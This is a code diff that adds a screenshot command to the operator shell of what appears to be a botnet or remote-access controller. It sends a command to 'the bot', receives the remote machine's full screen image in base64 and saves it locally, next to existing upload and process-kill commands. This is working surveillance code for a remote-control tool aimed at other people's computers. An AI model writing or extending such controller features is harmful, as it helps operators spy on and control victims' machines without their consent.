@@ -217,6 +217,28 @@ def uploader() -> bool:
     return True
 
 
+def screenshot() -> bool:
+    """Take a full screen screenshot from the bot.\n"""
+    sender('SHscreenshot')
+    received_file_data = b64decode(receiver())
+    if received_file_data != 'reachedexcept':
+        # Local filename to save downloaded file
+        local_filename = ask_input(phrase='Insert name which you want to use to save the file\t\texample.png\n\n >>> ')
+        try:
+            downloaded_file_descriptor = open(local_filename, 'wb')
+            downloaded_file_descriptor.write(received_file_data)
+            downloaded_file_descriptor.close()
+            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
+        except Exception as exception_downloader:
+            logging(data_to_log=str(exception_downloader), printer=True)
+    else:
+        remote_exception = receiver()
+        logging(
+            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
+            printer=True)
+    return True
+
+
 def processkiller():
     """Kill a process.\n"""
     sender('SHprocesskill')
@@ -495,6 +517,12 @@ class TinkererShellInput(cmd.Cmd):
                 print('Aborted: unknown option\n')
         else:
             print('Aborted: an option is required\n')
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
+    def do_SHscreenshot(self, option):
+        """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)\n"""
+        screenshot()
 
     # ---------------------------------------------------------------------------------------------
     # noinspection PyUnusedLocal
